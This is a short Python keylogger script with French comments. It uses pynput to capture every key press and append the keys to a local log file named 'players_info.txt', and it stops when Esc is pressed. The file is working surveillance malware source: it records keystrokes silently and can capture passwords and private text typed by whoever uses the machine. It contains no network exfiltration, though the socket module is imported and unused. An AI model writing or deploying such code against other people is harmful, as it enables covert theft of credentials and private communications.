import os
import socket 
import platform
from pynput.keyboard import Key, Listener

# Variables
keys_logs = "players_info.txt"
file_path = "C:\\Users\\Nolhan\\Documents\\CYB_TOOLS"
extend = "\\"

count = 0
keys = []

def capture(key):
    global count

    # Ajoute la touche à la liste
    keys.append(key)
    count += 1

    # Si la touche est "Entrée", enregistre les touches
    if key == Key.enter:
        createfiletxt()
        count = 0
        keys.clear()  # Réinitialise la liste des touches

    # Si la touche est "Espace", ajoute un espace
    elif key == Key.space:
        keys.append(' ')
        createfiletxt()
        count = 0
        keys.clear()  # Réinitialise la liste des touches

def createfiletxt():
    with open(os.path.join(file_path, keys_logs), "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k + " ")  # Écrit la touche dans le fichier

def stop_keylogger(key):
    if key == Key.esc:
        return False  # Arrête le listener


# Démarre le listener
with Listener(on_press=capture, on_release=stop_keylogger) as listener:
    listener.join()